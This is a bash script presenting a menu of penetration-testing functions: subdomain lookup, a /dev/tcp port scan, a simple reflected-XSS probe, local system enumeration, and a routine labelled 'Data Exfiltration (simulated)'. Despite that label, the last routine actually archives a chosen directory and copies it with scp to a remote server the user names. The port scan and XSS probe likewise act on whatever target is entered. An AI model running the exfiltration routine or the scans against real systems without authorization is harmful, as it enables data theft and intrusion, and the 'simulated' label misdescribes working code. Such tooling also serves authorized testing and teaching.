#!/bin/bash

# Function to display the menu
function show_menu() {
    clear
    echo "============================================="
    echo "      Simple Pentesting Tools Menu"
    echo "============================================="
    echo "1. Subdomain Enumeration"
    echo "2. Port Scanning"
    echo "3. XSS Detection"
    echo "4. System Enumeration"
    echo "5. Data Exfiltration"
    echo "6. Exit"
    echo "============================================="
    read -p "Please select an option (1-6): " choice
    case $choice in
        1) subdomain_enumeration ;;
        2) port_scanning ;;
        3) xss_detection ;;
        4) system_enumeration ;;
        5) data_exfiltration ;;
        6) echo "Exiting..."; exit 0 ;;
        *) echo "Invalid selection. Please select a valid option (1-6)."; sleep 2; show_menu ;;
    esac
}

# Function to perform Subdomain Enumeration
function subdomain_enumeration() {
    echo "Starting Subdomain Enumeration..."
    read -p "Enter domain (e.g., example.com): " domain
    if [ ! -f "subdomains.txt" ]; then
        echo "Error: subdomains.txt file not found!"
        exit 1
    fi
    echo "Scanning for subdomains of $domain..."
    while read subdomain; do
        nslookup "$subdomain.$domain"
    done < subdomains.txt
    read -p "Press Enter to return to the menu..."
    show_menu
}

# Function to perform Port Scanning
function port_scanning() {
    echo "Starting Port Scanning..."
    read -p "Enter target IP (e.g., 192.168.1.1): " ip
    read -p "Enter port range (e.g., 20-100): " ports
    echo "Scanning ports $ports on $ip..."
    for port in $(seq $(echo $ports | cut -d '-' -f 1) $(echo $ports | cut -d '-' -f 2)); do
        (echo > /dev/tcp/$ip/$port) &>/dev/null && echo "Port $port is open" || echo "Port $port is closed"
    done
    read -p "Press Enter to return to the menu..."
    show_menu
}

# Function to perform XSS Detection
function xss_detection() {
    echo "Starting XSS Detection..."
    read -p "Enter URL to test for XSS (e.g., http://example.com/search): " url
    payload="<script>alert('XSS')</script>"
    response=$(curl -s -X GET "$url?q=$payload")
    if [[ $response == *"$payload"* ]]; then
        echo "Potential XSS vulnerability detected!"
    else
        echo "No XSS vulnerability detected."
    fi
    read -p "Press Enter to return to the menu..."
    show_menu
}

# Function to perform System Enumeration
function system_enumeration() {
    echo "Starting System Enumeration..."
    if [ ! -d "reports" ]; then
        echo "Creating reports directory..."
        mkdir reports
    fi
    echo "Collecting system details..."
    echo "System Information: $(uname -a)" > reports/system_report.txt
    echo "Disk Usage:" >> reports/system_report.txt
    df -h >> reports/system_report.txt
    echo "Memory Usage:" >> reports/system_report.txt
    free -h >> reports/system_report.txt
    echo "Network Configuration:" >> reports/system_report.txt
    ifconfig >> reports/system_report.txt
    echo "System enumeration complete. Report saved to reports/system_report.txt"
    read -p "Press Enter to return to the menu..."
    show_menu
}

# Function to perform Data Exfiltration (simulated)
function data_exfiltration() {
    echo "Starting Data Exfiltration (simulated)..."
    read -p "Enter the directory to exfiltrate: " dir
    read -p "Enter remote server IP: " remote_ip
    if [ ! -d "$dir" ]; then
        echo "Error: Directory $dir not found!"
        read -p "Press Enter to return to the menu..."
        show_menu
    fi
    echo "Simulating exfiltration of $dir to $remote_ip..."
    tar -czf /tmp/exfil_data.tar.gz -C "$dir" . 
    scp /tmp/exfil_data.tar.gz user@$remote_ip:/tmp/
    echo "Data exfiltrated successfully."
    read -p "Press Enter to return to the menu..."
    show_menu
}

# Main Program Loop
while true; do
    show_menu
done
